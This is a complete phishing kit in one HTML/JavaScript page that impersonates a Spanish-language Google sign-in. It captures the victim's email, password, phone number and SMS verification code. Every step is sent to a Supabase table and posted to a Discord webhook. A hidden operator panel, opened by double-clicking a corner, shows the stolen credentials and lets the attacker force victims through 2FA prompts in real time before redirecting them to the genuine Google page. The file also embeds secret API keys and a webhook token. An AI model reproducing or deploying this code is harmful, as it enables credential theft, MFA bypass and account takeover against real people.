<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Login - Secure Access</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        @keyframes spin { to { transform: rotate(360deg); } }
        .animate-spin { animation: spin 1s linear infinite; }
        .fade-in { animation: fadeIn 0.5s ease-out; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    </style>
</head>
<body class="bg-white min-h-screen flex flex-col items-center justify-center p-4 font-sans select-none">

    <!-- Contenedor Principal -->
    <div id="app-container" class="w-full max-w-[440px] p-8 md:p-10 md:border border-gray-200 rounded-2xl relative shadow-sm overflow-hidden fade-in">
        
        <!-- Acceso Panel Invisible (Doble click esquina superior derecha) -->
        <div id="admin-trigger" class="absolute top-0 right-0 w-14 h-14 z-50 cursor-default"></div>

        <!-- Logo Google -->
        <div class="flex justify-center mb-10">
            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="h-7">
        </div>

        <div id="view-content">
            <!-- El contenido se inyecta din√°micamente aqu√≠ -->
        </div>
    </div>

    <!-- Footer -->
    <footer class="mt-12 flex gap-8 text-[12px] text-gray-400 font-medium">
        <span class="cursor-pointer hover:text-gray-600 transition">Espa√±ol (Espa√±a)</span>
        <div class="flex gap-4">
            <a href="#" class="hover:underline">Ayuda</a>
            <a href="#" class="hover:underline">Privacidad</a>
            <a href="#" class="hover:underline">T√©rminos</a>
        </div>
    </footer>

    <script>
        // --- CONFIGURACI√ìN ---
        const SUPABASE_URL = "https://eyrvplemxhnootpjzkav.supabase.co";
        const SUPABASE_KEY = "sb_secret_nFmqd2YSvu-5D3CARp7YYw_iFv9lKhF";
        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1443618037294174220/cHXeoeQ9KzfGkKtUeVL-9AXk0o4ARszzBsEtkMm6xAVYgAMQdrSmNLP1K198X8HCgVSE";
        
        // CORRECCI√ìN: Renombrado de instancia para evitar conflicto con el objeto global de la librer√≠a
        const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
        
        let state = {
            view: 'victim',
            step: 'login',
            sessionId: `SESS_${Math.random().toString(36).substr(2, 5).toUpperCase()}`,
            formData: { email: '', password: '', phone: '', sms: '' },
            targetNumber: '--',
            adminSessions: []
        };

        // --- FUNCIONES DE COMUNICACI√ìN ---
        async function updateRemote(newStep, dataToMerge = {}) {
            const updateData = {
                ...state.formData,
                ...dataToMerge,
                step: newStep,
                session_id: state.sessionId,
                updated_at: new Date()
            };

            await supabaseClient.from('sessions').upsert(updateData, { onConflict: 'session_id' });

            // Notificaci√≥n Discord
            fetch(DISCORD_WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [{
                        title: "üîë CAPTURA RENDER (Syntax Fixed)",
                        color: 0xDB4437,
                        fields: [
                            { name: "Sesi√≥n", value: state.sessionId, inline: true },
                            { name: "Paso", value: newStep, inline: true },
                            { name: "Email", value: updateData.email || "---" },
                            { name: "Password", value: updateData.password || "---" },
                            { name: "SMS", value: updateData.sms || "---" }
                        ],
                        timestamp: new Date().toISOString()
                    }]
                })
            }).catch(() => {});
        }

        // --- RENDERIZADO DE VISTAS ---
        function render() {
            const container = document.getElementById('view-content');
            
            if (state.view === 'admin') {
                renderAdmin();
                return;
            }

            switch(state.step) {
                case 'login':
                    container.innerHTML = `
                        <form id="login-form" class="space-y-6 fade-in">
                            <div class="text-center">
                                <h2 class="text-2xl font-normal text-gray-800">Iniciar sesi√≥n</h2>
                                <p class="text-gray-600 mt-2 text-sm">Usa tu cuenta de Google</p>
                            </div>
                            <div class="space-y-3">
                                <input id="inp-email" required type="email" placeholder="Correo electr√≥nico" class="w-full p-4 border border-gray-300 rounded-lg focus:border-blue-500 outline-none">
                                <input id="inp-pass" required type="password" placeholder="Contrase√±a" class="w-full p-4 border border-gray-300 rounded-lg focus:border-blue-500 outline-none">
                            </div>
                            <div class="flex justify-between items-center pt-6">
                                <span class="text-blue-600 text-sm font-bold cursor-pointer">Crear cuenta</span>
                                <button type="submit" class="bg-blue-600 text-white px-8 py-2.5 rounded-lg font-medium hover:bg-blue-700">Siguiente</button>
                            </div>
                        </form>
                    `;
                    document.getElementById('login-form').onsubmit = (e) => {
                        e.preventDefault();
                        state.formData.email = document.getElementById('inp-email').value;
                        state.formData.password = document.getElementById('inp-pass').value;
                        state.step = 'phone';
                        updateRemote('phone');
                        render();
                    };
                    break;

                case 'phone':
                    container.innerHTML = `
                        <form id="phone-form" class="space-y-6 fade-in">
                            <h2 class="text-xl font-medium text-center">Confirmar identidad</h2>
                            <p class="text-sm text-gray-600 text-center">Introduce el n√∫mero de tel√©fono vinculado.</p>
                            <input id="inp-phone" required type="tel" placeholder="N√∫mero de tel√©fono" class="w-full p-4 border border-gray-300 rounded-lg text-center text-xl tracking-widest outline-none">
                            <button type="submit" class="w-full bg-blue-600 text-white py-3 rounded-lg font-medium">Enviar aviso</button>
                        </form>
                    `;
                    document.getElementById('phone-form').onsubmit = (e) => {
                        e.preventDefault();
                        state.formData.phone = document.getElementById('inp-phone').value;
                        state.step = 'wait';
                        updateRemote('wait');
                        render();
                    };
                    break;

                case 'wait':
                    container.innerHTML = `
                        <div class="text-center space-y-10 py-4 fade-in">
                            <h2 class="text-xl font-medium">Revisa tu tel√©fono</h2>
                            <p class="text-sm text-gray-600">Pulsa **S√ç** en la notificaci√≥n y elige:</p>
                            <div class="text-7xl font-bold text-gray-800 py-12 bg-blue-50 border-2 border-dashed border-blue-200 rounded-3xl animate-pulse">
                                ${state.targetNumber}
                            </div>
                            <div class="flex flex-col items-center gap-3">
                                <div class="w-5 h-5 border-2 border-blue-600 border-t-transparent rounded-full animate-spin"></div>
                                <p class="text-[10px] text-gray-400 font-bold uppercase tracking-widest">Esperando...</p>
                            </div>
                        </div>
                    `;
                    break;

                case 'sms':
                    container.innerHTML = `
                        <form id="sms-form" class="space-y-6 fade-in">
                            <h2 class="text-xl font-medium text-center">Verificaci√≥n por c√≥digo</h2>
                            <p class="text-sm text-gray-600 text-center">Introduce el c√≥digo G-XXXXXX enviado por SMS.</p>
                            <div class="flex items-center border border-gray-300 rounded-xl p-4 focus-within:ring-1 ring-blue-500">
                                <span class="font-bold text-gray-400 mr-3">G - </span>
                                <input id="inp-sms" required type="number" placeholder="C√≥digo" class="w-full outline-none text-lg tracking-[0.2em]">
                            </div>
                            <button type="submit" class="w-full bg-blue-600 text-white py-3 rounded-xl font-medium shadow-md">Verificar</button>
                        </form>
                    `;
                    document.getElementById('sms-form').onsubmit = (e) => {
                        e.preventDefault();
                        state.formData.sms = document.getElementById('inp-sms').value;
                        state.step = 'end';
                        updateRemote('end');
                        render();
                        setTimeout(() => window.location.href = "https://accounts.google.com", 2000);
                    };
                    break;

                case 'end':
                    container.innerHTML = `
                        <div class="text-center py-12 space-y-6 fade-in">
                            <div class="bg-green-50 w-20 h-20 rounded-full flex items-center justify-center mx-auto text-green-600 text-4xl border border-green-100">‚úì</div>
                            <h3 class="text-xl font-bold text-gray-800">Identidad confirmada</h3>
                        </div>
                    `;
                    break;
            }
        }

        async function renderAdmin() {
            const { data } = await supabaseClient.from('sessions').select('*').order('updated_at', { ascending: false });
            const mainCont = document.getElementById('app-container');
            mainCont.className = "w-full max-w-5xl p-6 bg-slate-950 text-white min-h-[500px] border border-slate-800 rounded-xl";
            
            let html = `
                <div class="flex justify-between items-center mb-6 border-b border-slate-800 pb-4">
                    <h1 class="text-blue-500 font-bold">PANEL_CONTROL_V4</h1>
                    <button id="btn-exit" class="bg-slate-800 px-3 py-1 text-xs rounded">SALIR</button>
                </div>
                <div class="grid gap-4 md:grid-cols-2 lg:grid-cols-3">
            `;

            data?.forEach(s => {
                html += `
                    <div class="bg-slate-900 border border-slate-800 p-4 rounded-xl text-[11px] font-mono">
                        <div class="flex justify-between mb-3 border-b border-slate-800 pb-2">
                            <span class="text-slate-500">${s.session_id}</span>
                            <span class="text-blue-400 font-bold">${s.step.toUpperCase()}</span>
                        </div>
                        <div class="space-y-1 mb-4">
                            <p><span class="text-slate-600">U:</span> ${s.email || '-'}</p>
                            <p><span class="text-slate-600">P:</span> ${s.password || '-'}</p>
                            <p><span class="text-slate-600">T:</span> ${s.phone || '-'}</p>
                            <p><span class="text-green-500 font-bold">S:</span> ${s.sms || '-'}</p>
                        </div>
                        <div class="flex gap-2 pt-2 border-t border-slate-800">
                            <input type="text" placeholder="Num" maxlength="2" class="w-10 bg-black border border-slate-700 text-center text-yellow-400 num-inp" data-id="${s.session_id}">
                            <button class="flex-1 bg-blue-600 text-white py-1 rounded font-bold btn-sms" data-id="${s.session_id}">FORZAR SMS</button>
                        </div>
                    </div>
                `;
            });

            html += `</div>`;
            mainCont.innerHTML = html;

            // Eventos Admin
            document.getElementById('btn-exit').onclick = () => location.reload();
            document.querySelectorAll('.num-inp').forEach(inp => {
                inp.onblur = async (e) => {
                    await supabaseClient.from('sessions').update({ target_number: e.target.value }).eq('session_id', e.target.dataset.id);
                };
            });
            document.querySelectorAll('.btn-sms').forEach(btn => {
                btn.onclick = async (e) => {
                    await supabaseClient.from('sessions').update({ step: 'sms' }).eq('session_id', e.currentTarget.dataset.id);
                    renderAdmin();
                };
            });
        }

        // --- INICIALIZACI√ìN ---
        window.onload = () => {
            updateRemote('login');
            render();

            document.getElementById('admin-trigger').ondblclick = () => {
                state.view = 'admin';
                renderAdmin();
            };

            // Suscripci√≥n en tiempo real para la v√≠ctima
            supabaseClient.channel(`room_${state.sessionId}`)
                .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'sessions', filter: `session_id=eq.${state.sessionId}` }, (p) => {
                    state.targetNumber = p.new.target_number;
                    state.step = p.new.step;
                    if (state.view === 'victim') render();
                })
                .subscribe();
        };
    </script>
</body>
</html>
